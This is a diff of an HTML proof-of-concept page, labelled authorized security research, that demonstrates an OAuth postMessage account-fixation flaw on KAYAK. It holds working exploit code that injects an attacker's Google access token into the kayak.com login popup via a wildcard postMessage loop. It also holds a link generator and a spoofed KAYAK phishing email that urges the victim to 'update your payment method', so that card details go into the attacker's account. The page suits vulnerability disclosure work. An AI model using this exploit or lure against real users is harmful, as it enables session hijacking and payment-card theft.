@@ -7,86 +7,78 @@
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, sans-serif;
                background: #0a0e14; color: #c9d1d9; min-height: 100vh; }
 
-        /* ===== SHARED ===== */
         .container { max-width: 760px; margin: 0 auto; padding: 32px 24px; }
 
+        /* Steps */
         .step { background: #161b22; border: 2px solid #30363d; border-radius: 10px;
                 padding: 28px; margin-bottom: 20px; position: relative; }
         .step.active { border-color: #58a6ff; }
         .step.done { border-color: #3fb950; opacity: 0.7; }
         .step.locked { opacity: 0.35; pointer-events: none; }
         .step-badge { display: inline-block; width: 32px; height: 32px; line-height: 32px; text-align: center;
-                      border-radius: 50%; font-weight: 700; font-size: 14px; margin-right: 10px; }
+                      border-radius: 50%; font-weight: 700; font-size: 14px; margin-right: 10px; vertical-align: middle; }
         .step.active .step-badge { background: #1f6feb; color: #fff; }
         .step.done .step-badge { background: #238636; color: #fff; }
         .step.locked .step-badge { background: #30363d; color: #8b949e; }
-        .step h2 { display: inline; font-size: 17px; color: #e6edf3; }
+        .step h2 { display: inline; font-size: 17px; color: #e6edf3; vertical-align: middle; }
         .step-status { float: right; font-size: 12px; padding: 4px 12px; border-radius: 12px; font-weight: 600; }
         .st-wait { background: #30363d; color: #8b949e; }
-        .st-active { background: #1f3d5c; color: #58a6ff; }
+        .st-run { background: #1f3d5c; color: #58a6ff; }
         .st-done { background: #1f3d2d; color: #3fb950; }
         .step-body { margin-top: 16px; }
         .step-body p { font-size: 14px; color: #8b949e; line-height: 1.7; margin-bottom: 10px; }
 
-        .banner-researcher { background: #161b22; border-bottom: 2px solid #e94560;
-                             padding: 14px 32px; text-align: center; }
-        .banner-researcher h1 { font-size: 17px; color: #e6edf3; }
-        .banner-researcher span { color: #e94560; }
+        .banner { background: #161b22; border-bottom: 2px solid #e94560; padding: 14px 32px; text-align: center; }
+        .banner h1 { font-size: 17px; color: #e6edf3; }
+        .banner span { color: #e94560; }
 
-        /* Buttons */
         .btn { padding: 12px 24px; border-radius: 6px; font-size: 15px; font-weight: 600;
                cursor: pointer; border: none; transition: all 0.15s; }
         .btn:hover { filter: brightness(1.1); transform: translateY(-1px); }
         .btn:disabled { opacity: 0.35; cursor: not-allowed; transform: none; filter: none; }
         .btn-green { background: #238636; color: white; border: 2px solid #3fb950; }
-        .btn-red { background: #da3633; color: white; }
         .btn-blue { background: #1f6feb; color: white; }
 
-        /* Input */
         input[type="text"] { background: #0d1117; color: #e6edf3; border: 1px solid #30363d; padding: 11px 14px;
                              width: 100%; font-family: monospace; font-size: 13px; border-radius: 6px; margin: 6px 0; }
         input:focus { border-color: #58a6ff; outline: none; }
 
-        /* Phishing email preview */
-        .email-preview { background: #ffffff; color: #333; border-radius: 8px; padding: 0; margin: 16px 0;
-                        overflow: hidden; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
+        .highlight { background: #1a1206; border: 2px solid #d29922; border-radius: 8px;
+                     padding: 14px 18px; margin: 14px 0; }
+        .highlight strong { color: #d29922; }
+
+        .info { background: #0d1117; border: 1px solid #30363d; border-radius: 6px;
+                padding: 14px 18px; margin: 14px 0; font-size: 13px; color: #8b949e; line-height: 1.7; }
+        .info strong { color: #58a6ff; }
+
+        /* Phishing email */
+        .email-preview { background: #ffffff; color: #333; border-radius: 8px; margin: 16px 0; overflow: hidden;
+                        font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
         .email-header { background: #f6f8fa; padding: 12px 20px; border-bottom: 1px solid #e1e4e8; font-size: 12px; color: #666; }
         .email-header strong { color: #333; }
         .email-body { padding: 28px 24px; }
         .email-body .kayak-logo { color: #ff690f; font-size: 28px; font-weight: 800; letter-spacing: -1px; margin-bottom: 20px; }
         .email-body h3 { color: #333; font-size: 18px; margin-bottom: 12px; }
         .email-body p { color: #555; font-size: 14px; line-height: 1.7; margin-bottom: 14px; }
-        .email-body .cta-btn { display: inline-block; background: #ff690f; color: white !important; padding: 12px 28px;
-                               border-radius: 6px; text-decoration: none; font-weight: 600; font-size: 15px; }
+        .email-body .cta-btn { display: inline-block; background: #ff690f; color: white !important;
+                               padding: 12px 28px; border-radius: 6px; text-decoration: none; font-weight: 600; font-size: 15px; }
         .email-body .footer-text { font-size: 11px; color: #999; margin-top: 24px; border-top: 1px solid #eee; padding-top: 16px; }
 
-        /* Link box */
         .link-box { background: #0d1117; border: 2px solid #58a6ff; border-radius: 6px; padding: 14px;
                     font-family: monospace; font-size: 12px; word-break: break-all; margin: 12px 0;
                     color: #58a6ff; user-select: all; cursor: pointer; }
 
-        /* Highlight */
-        .highlight { background: #1a1206; border: 2px solid #d29922; border-radius: 8px;
-                     padding: 14px 18px; margin: 14px 0; }
-        .highlight strong { color: #d29922; }
-
-        .info { background: #0d1117; border: 1px solid #30363d; border-radius: 6px;
-                padding: 14px 18px; margin: 14px 0; font-size: 13px; }
-
-        /* ===== VICTIM MODE ===== */
+        /* Victim mode */
         .victim-loading { text-align: center; padding: 60px 20px; }
-        .victim-loading .spinner { width: 40px; height: 40px; border: 3px solid #30363d; border-top-color: #ff690f;
-                                   border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
+        .spinner { width: 40px; height: 40px; border: 3px solid #30363d; border-top-color: #ff690f;
+                   border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .victim-loading p { color: #8b949e; font-size: 15px; }
 
-        /* Status line */
-        .status-line { text-align: center; margin-top: 10px; font-size: 14px; }
+        .status-line { text-align: center; margin-top: 12px; font-size: 15px; font-weight: 600; }
         .status-line.injecting { color: #e94560; }
         .status-line.waiting { color: #d29922; }
-        .status-line.done { color: #3fb950; font-weight: 600; }
+        .status-line.done { color: #3fb950; }
 
-        /* Technical log */
         .log-toggle { color: #484f58; font-size: 12px; cursor: pointer; text-align: center; margin-top: 14px; }
         .log-toggle:hover { color: #8b949e; }
         .log-panel { display: none; background: #0d1117; border: 1px solid #30363d; border-radius: 6px;
@@ -96,72 +88,57 @@
         .l-info { color: #58a6ff; } .l-red { color: #e94560; } .l-ok { color: #3fb950; }
         .l-dim { color: #484f58; } .l-warn { color: #d29922; }
 
-        /* Proof */
         .proof-box { background: #0d1117; border: 3px solid #3fb950; border-radius: 10px;
                      padding: 28px; text-align: center; margin: 20px 0; }
         .proof-box h3 { color: #3fb950; font-size: 18px; margin-bottom: 8px; }
 
-        /* Code */
         .code-block { background: #0d1117; border: 1px solid #30363d; border-radius: 6px;
                       padding: 14px; font-family: monospace; font-size: 12px; line-height: 1.6;
                       overflow-x: auto; margin: 12px 0; white-space: pre-wrap; }
-        .code-vuln { color: #e94560; } .code-safe { color: #3fb950; }
+        .cv { color: #e94560; } .cs { color: #3fb950; }
 
         .footer { text-align: center; padding: 20px; color: #30363d; font-size: 11px; }
     </style>
 </head>
 <body>
 
-<!-- ===================================================================
-     MODE DETECTION: ?t=TOKEN switches to victim (attack) mode
-     No param = attacker setup mode
-     =================================================================== -->
-
-<!-- ===================== ATTACKER SETUP MODE ===================== -->
+<!-- ===== ATTACKER SETUP MODE (no ?t= param) ===== -->
 <div id="attacker-mode" style="display:none;">
 
-    <div class="banner-researcher">
+    <div class="banner">
         <h1>KAYAK <span>OAuth postMessage</span> Account Fixation — PoC</h1>
     </div>
 
     <div class="container">
 
-        <!-- STEP 1: Get token -->
-        <div class="step active" id="a-step1">
-            <span class="step-status st-active" id="a-step1-st">Step 1</span>
+        <div class="step active" id="a1">
+            <span class="step-status st-run" id="a1-st">Step 1</span>
             <span class="step-badge">1</span>
-            <h2>Sign in as the attacker</h2>
+            <h2>Attacker captures their Google OAuth token</h2>
             <div class="step-body">
-                <p>In an <strong>incognito window</strong>, sign into KAYAK with a second Google account (the "attacker" account). Then capture the OAuth token:</p>
-                <div class="info">
-                    <strong style="color:#58a6ff;">1.</strong> Open <strong>incognito</strong> → go to <code>kayak.com/login</code><br>
-                    <strong style="color:#58a6ff;">2.</strong> Open DevTools → <strong>Network</strong> tab → filter: <code>googleauth</code><br>
-                    <strong style="color:#58a6ff;">3.</strong> Click <strong>"Sign in with Google"</strong> → complete sign-in with the attacker account<br>
-                    <strong style="color:#58a6ff;">4.</strong> Find: <code>POST /k/run/googleauth/login</code> → <strong>Payload</strong> tab → copy <code>accessToken</code>
-                </div>
-                <input type="text" id="tokenInput" placeholder="Paste access_token here (ya29.a0...)">
-                <br>
-                <button class="btn btn-green" onclick="setToken()" style="margin-top:8px;">Token captured →</button>
+                <p>Sign into <a href="https://www.kayak.com/login" target="_blank" style="color:#58a6ff;">kayak.com/login</a> with the <strong style="color:#e94560;">attacker's</strong> Google account. Capture the <code>accessToken</code> from <code>POST /k/run/googleauth/login</code> in your proxy or DevTools Network tab.</p>
+                <input type="text" id="tokenInput" placeholder="Paste attacker's access_token here">
+                <button class="btn btn-green" onclick="setToken()" style="margin-top:8px;">Generate phishing link →</button>
             </div>
         </div>
 
-        <!-- STEP 2: Weaponized link + email -->
-        <div class="step locked" id="a-step2">
-            <span class="step-status st-wait" id="a-step2-st">Step 2</span>
+        <div class="step locked" id="a2">
+            <span class="step-status st-wait" id="a2-st">Step 2</span>
             <span class="step-badge">2</span>
-            <h2>Phishing email with weaponized link</h2>
+            <h2>Attacker sends phishing email to victim</h2>
             <div class="step-body">
-                <p>The attacker's token is now embedded in a URL. When the victim clicks this link, their browser will open KAYAK's login page and the attacker's token will be injected via <code>postMessage</code>.</p>
+                <p>The attacker's token is embedded in a weaponized URL. When the victim clicks it, their session is silently switched to the attacker's account.</p>
 
                 <p><strong style="color:#e6edf3;">Weaponized URL:</strong></p>
                 <div class="link-box" id="weaponLink" onclick="copyLink()">—</div>
-                <button class="btn btn-blue" onclick="copyLink()" style="margin-top:4px;" id="btnCopy">Copy link</button>
+                <button class="btn btn-blue" onclick="copyLink()" id="btnCopy" style="margin-top:4px;">Copy link</button>
 
-                <p style="margin-top:18px;"><strong style="color:#e6edf3;">The attacker sends this in a phishing email:</strong></p>
+                <p style="margin-top:20px;"><strong style="color:#e6edf3;">Phishing email delivered to victim:</strong></p>
 
                 <div class="email-preview">
                     <div class="email-header">
                         <strong>From:</strong> KAYAK Travel &lt;no-reply@kayak-notifications.com&gt;<br>
+                        <strong>To:</strong> victim@gmail.com<br>
                         <strong>Subject:</strong> Action required — update your payment method
                     </div>
                     <div class="email-body">
@@ -178,7 +155,7 @@
                 </div>
 
                 <div class="highlight">
-                    <strong>For the video:</strong> Open the weaponized link in the <strong>victim's browser</strong> (the one logged into KAYAK with the victim's own Google account). This simulates the victim clicking the phishing email.
+                    <strong>Next:</strong> Open the weaponized link in a browser where the <strong>victim</strong> is logged into KAYAK with their own Google account. This simulates the victim clicking the email.
                 </div>
             </div>
         </div>
@@ -186,146 +163,122 @@
     </div>
 </div>
 
-<!-- ===================== VICTIM MODE (auto-attack) ===================== -->
+<!-- ===== VICTIM MODE (?t=TOKEN) ===== -->
 <div id="victim-mode" style="display:none;">
 
     <div class="container">
 
-        <div class="victim-loading" id="victim-loading">
+        <div class="victim-loading" id="vLoading">
             <div class="spinner"></div>
-            <p>Connecting to KAYAK...</p>
+            <p style="color:#8b949e; font-size:15px;">Connecting to KAYAK...</p>
         </div>
 
-        <div id="victim-attack" style="display:none;">
+        <div id="vAttack" style="display:none;">
             <div class="step active">
-                <span class="step-badge" style="background:#e94560;color:#fff;">!</span>
-                <h2>Sign in to continue</h2>
+                <span class="step-badge" style="background:#ff690f; color:#fff;">!</span>
+                <h2>Sign in to update your payment details</h2>
                 <div class="step-body">
-                    <p>A KAYAK login window has opened. Click <strong>"Sign in with Google"</strong> to re-authenticate and update your payment details.</p>
-                    <div class="status-line" id="victimStatus"></div>
+                    <p>A KAYAK sign-in window has opened. Click <strong>"Sign in with Google"</strong> to continue.</p>
+                    <div class="status-line" id="vStatus"></div>
                 </div>
             </div>
 
-            <div class="log-toggle" onclick="document.getElementById('victimLog').classList.toggle('show')">▼ Technical details (for analyst review)</div>
-            <div class="log-panel" id="victimLog"></div>
+            <div class="log-toggle" onclick="document.getElementById('vLog').classList.toggle('show')">▼ Technical details (analyst)</div>
+            <div class="log-panel" id="vLog"></div>
         </div>
 
-        <div id="victim-done" style="display:none;">
+        <div id="vDone" style="display:none;">
             <div class="proof-box">
-                <h3>Account Fixation Complete</h3>
-                <p style="color:#8b949e; margin-top:8px;">The victim's browser is now logged into the <strong style="color:#e94560;">attacker's</strong> KAYAK account.</p>
+                <h3>Account Fixation Successful</h3>
+                <p style="color:#8b949e; margin-top:8px;">The victim's browser session is now the <strong style="color:#e94560;">attacker's</strong> KAYAK account.</p>
             </div>
+
             <div class="highlight">
-                <strong>Open <a href="https://www.kayak.com/profile/payment" target="_blank" style="color:#d29922;">kayak.com/profile/payment</a></strong> — this is the attacker's account. Any credit card details entered here are stored in the attacker's account and can be retrieved by the attacker later.
+                <strong>Open <a href="https://www.kayak.com/profile/payment" target="_blank" style="color:#d29922;">kayak.com/profile/payment</a></strong><br><br>
+                The victim believes they are updating <em>their own</em> payment details — but this is the attacker's account. Any credit card entered here is stored in the attacker's account.
             </div>
+
             <div class="step" style="display:block; border-color:#30363d; margin-top:20px;">
                 <h2 style="display:block; font-size:16px; margin-bottom:12px;">What happened</h2>
                 <p style="font-size:13px; color:#8b949e; line-height:1.7;">
-                    The phishing link opened this page, which sent a cross-origin <code>postMessage</code>
-                    to <code>kayak.com/login</code> containing the attacker's Google OAuth token. KAYAK's
-                    login handler checks <code>event.data.action === "googleLogin"</code> but does
-                    <strong style="color:#e94560;">not check <code>event.origin</code></strong>.
-                    It processed the attacker's token and set the session to the attacker's account.
+                    The victim clicked a link in a phishing email. That link opened this page, which sent a
+                    cross-origin <code>postMessage</code> to <code>kayak.com/login</code> containing the
+                    <strong style="color:#e94560;">attacker's</strong> Google OAuth <code>access_token</code>.
                 </p>
-                <div class="code-block"><span class="code-vuln">// Google OAuth — NO origin check:</span>
+                <p style="font-size:13px; color:#8b949e; line-height:1.7;">
+                    KAYAK's postMessage listener checks <code>event.data.action === "googleLogin"</code> but
+                    <strong style="color:#e94560;">does not check <code>event.origin</code></strong>.
+                    It accepted the attacker's token from <code id="proofOrigin"></code> and called
+                    <code>POST /k/run/googleauth/login</code> — switching the victim's session to the attacker's account.
+                </p>
+                <p style="font-size:13px; color:#8b949e; line-height:1.7;">
+                    The Microsoft/Outlook OAuth handler in the same codebase <strong style="color:#3fb950;">correctly validates <code>event.origin</code></strong>.
+                </p>
+                <div class="code-block"><span class="cv">// Google — NO origin check (vulnerable):</span>
 "googleLogin"===t.action ? (i&&i.close(), t.access_token ? n(t) : o(t)) : o(e)
 
-<span class="code-safe">// Microsoft handler (same codebase) — HAS origin check:</span>
-<span class="code-safe">if (e.origin !== expectedOrigin) return;</span></div>
+<span class="cs">// Microsoft — HAS origin check (secure):</span>
+<span class="cs">if (e.origin !== expectedOrigin) return;</span></div>
             </div>
         </div>
 
     </div>
 </div>
 
-<div class="footer">
-    KAYAK OAuth postMessage Account Fixation — CWE-346 — Authorized security research
-</div>
+<div class="footer">KAYAK OAuth postMessage Account Fixation — CWE-346 — Authorized security research</div>
 
 <script>
-// ============================================================
-// MODE: ?t=<token> = victim mode (auto-attack)
-//       no param   = attacker setup mode
-// ============================================================
-
 var params = new URLSearchParams(location.search);
 var urlToken = params.get('t');
 
 if (urlToken) {
-    // ========== VICTIM MODE ==========
     document.getElementById('victim-mode').style.display = '';
-    startVictimMode(urlToken);
+    setTimeout(function() {
+        document.getElementById('vLoading').style.display = 'none';
+        document.getElementById('vAttack').style.display = '';
+        launchInjection(urlToken);
+    }, 1500);
 } else {
-    // ========== ATTACKER SETUP MODE ==========
     document.getElementById('attacker-mode').style.display = '';
 }
 
-// ==================== ATTACKER SETUP ====================
+// ===== ATTACKER SETUP =====
 
 function setToken() {
     var token = document.getElementById('tokenInput').value.trim();
-    if (!token) {
-        document.getElementById('tokenInput').style.borderColor = '#da3633';
-        return;
-    }
+    if (!token) { document.getElementById('tokenInput').style.borderColor = '#da3633'; return; }
 
-    // Build weaponized URL
-    var weaponUrl = location.origin + location.pathname + '?t=' + encodeURIComponent(token);
+    var url = location.origin + location.pathname + '?t=' + encodeURIComponent(token);
 
-    // Update Step 1 → done
-    var s1 = document.getElementById('a-step1');
-    s1.className = 'step done';
-    document.getElementById('a-step1-st').className = 'step-status st-done';
-    document.getElementById('a-step1-st').textContent = 'Done';
+    document.getElementById('a1').className = 'step done';
+    document.getElementById('a1-st').className = 'step-status st-done';
+    document.getElementById('a1-st').textContent = 'Done';
 
-    // Unlock Step 2
-    var s2 = document.getElementById('a-step2');
-    s2.className = 'step active';
-    document.getElementById('a-step2-st').className = 'step-status st-active';
-    document.getElementById('a-step2-st').textContent = 'Step 2';
+    document.getElementById('a2').className = 'step active';
+    document.getElementById('a2-st').className = 'step-status st-run';
+    document.getElementById('a2-st').textContent = 'Step 2';
 
-    // Populate link + email CTA
-    document.getElementById('weaponLink').textContent = weaponUrl;
-    document.getElementById('emailCta').href = weaponUrl;
+    document.getElementById('weaponLink').textContent = url;
+    document.getElementById('emailCta').href = url;
 }
 
 function copyLink() {
     var link = document.getElementById('weaponLink').textContent;
     if (link === '—') return;
     navigator.clipboard.writeText(link).then(function() {
-        var btn = document.getElementById('btnCopy');
-        btn.textContent = 'Copied!';
-        setTimeout(function() { btn.textContent = 'Copy link'; }, 2000);
+        var b = document.getElementById('btnCopy');
+        b.textContent = 'Copied!'; setTimeout(function() { b.textContent = 'Copy link'; }, 2000);
     });
 }
 
-// ==================== VICTIM MODE ====================
+// ===== VICTIM MODE =====
 
-var targetWin = null;
-var pollInterval = null;
-var checkInterval = null;
-var msgCount = 0;
-
-function startVictimMode(token) {
-    // Brief loading screen, then open popup
-    setTimeout(function() {
-        document.getElementById('victim-loading').style.display = 'none';
-        document.getElementById('victim-attack').style.display = '';
-        launchInjection(token);
-    }, 1500);
-}
+var targetWin, pollInt, checkInt, msgCount = 0;
 
 function vLog(msg, cls) {
-    var panel = document.getElementById('victimLog');
-    var ts = new Date().toISOString().substr(11, 12);
-    panel.innerHTML += '<span class="' + (cls || 'l-dim') + '">[' + ts + '] ' + msg + '</span>\n';
-    panel.scrollTop = panel.scrollHeight;
-}
-
-function setVictimStatus(msg, cls) {
-    var el = document.getElementById('victimStatus');
-    el.textContent = msg;
-    el.className = 'status-line ' + cls;
+    var p = document.getElementById('vLog');
+    p.innerHTML += '<span class="' + (cls||'l-dim') + '">[' + new Date().toISOString().substr(11,12) + '] ' + msg + '</span>\n';
+    p.scrollTop = p.scrollHeight;
 }
 
 function launchInjection(token) {
@@ -333,57 +286,48 @@ function launchInjection(token) {
 
     targetWin = window.open('https://www.kayak.com/login', 'kayak', 'width=1100,height=750,left=100,top=100');
     if (!targetWin) {
-        setVictimStatus('Popup blocked — allow popups and refresh', 'injecting');
+        document.getElementById('vStatus').textContent = 'Popup blocked — allow popups and refresh';
+        document.getElementById('vStatus').className = 'status-line injecting';
         return;
     }
 
     vLog('Popup opened', 'l-ok');
     vLog('Injecting attacker token via postMessage from ' + location.origin, 'l-red');
-    setVictimStatus('Click "Sign in with Google" on the KAYAK popup', 'waiting');
+    document.getElementById('vStatus').textContent = 'Click "Sign in with Google" on the KAYAK popup';
+    document.getElementById('vStatus').className = 'status-line waiting';
 
     msgCount = 0;
-    pollInterval = setInterval(function() {
+    pollInt = setInterval(function() {
         try {
             targetWin.postMessage({ action: "googleLogin", access_token: token }, "*");
             msgCount++;
             if (msgCount === 1) {
                 vLog('postMessage({action:"googleLogin", access_token:"' + token.substring(0,16) + '..."}, "*")', 'l-red');
-                vLog('KAYAK listener has no event.origin check — accepts from any origin', 'l-red');
+                vLog('No event.origin check — accepted from any origin', 'l-red');
             }
             if (msgCount % 100 === 0) vLog(msgCount + ' messages injected', 'l-dim');
-        } catch(e) {
-            if (targetWin && targetWin.closed) onVictimDone();
-        }
+        } catch(e) { if (targetWin && targetWin.closed) onDone(); }
     }, 100);
 
-    checkInterval = setInterval(function() {
-        try { if (targetWin && targetWin.closed) onVictimDone(); } catch(e) {}
+    checkInt = setInterval(function() {
+        try { if (targetWin && targetWin.closed) onDone(); } catch(e) {}
     }, 500);
 
-    setTimeout(function() {
-        if (pollInterval) setVictimStatus('Waiting — click "Sign in with Google" on the popup', 'waiting');
-    }, 8000);
-
-    setTimeout(function() {
-        if (pollInterval) { stopInjection(); setVictimStatus('Timed out — refresh and try again', 'injecting'); }
-    }, 120000);
+    setTimeout(function() { if (pollInt) { document.getElementById('vStatus').textContent = 'Waiting — click "Sign in with Google" on the popup'; } }, 8000);
+    setTimeout(function() { if (pollInt) { clearInterval(pollInt); pollInt = null; clearInterval(checkInt); } }, 120000);
 }
 
-function onVictimDone() {
-    stopInjection();
-    vLog('Popup closed — ' + msgCount + ' injections sent from ' + location.origin, 'l-ok');
-    vLog('Victim session now set to attacker account (no origin validation on postMessage)', 'l-ok');
-    setVictimStatus('Account fixation complete', 'done');
-
+function onDone() {
+    if (pollInt) { clearInterval(pollInt); pollInt = null; }
+    if (checkInt) { clearInterval(checkInt); checkInt = null; }
+    vLog('Popup closed — ' + msgCount + ' injections from ' + location.origin, 'l-ok');
+    document.getElementById('vStatus').textContent = 'Account fixation complete';
+    document.getElementById('vStatus').className = 'status-line done';
+    document.getElementById('proofOrigin').textContent = location.origin;
     setTimeout(function() {
-        document.getElementById('victim-attack').style.display = 'none';
-        document.getElementById('victim-done').style.display = '';
+        document.getElementById('vAttack').style.display = 'none';
+        document.getElementById('vDone').style.display = '';
     }, 1500);
-}
-
-function stopInjection() {
-    if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
-    if (checkInterval) { clearInterval(checkInterval); checkInterval = null; }
 }
 </script>
 
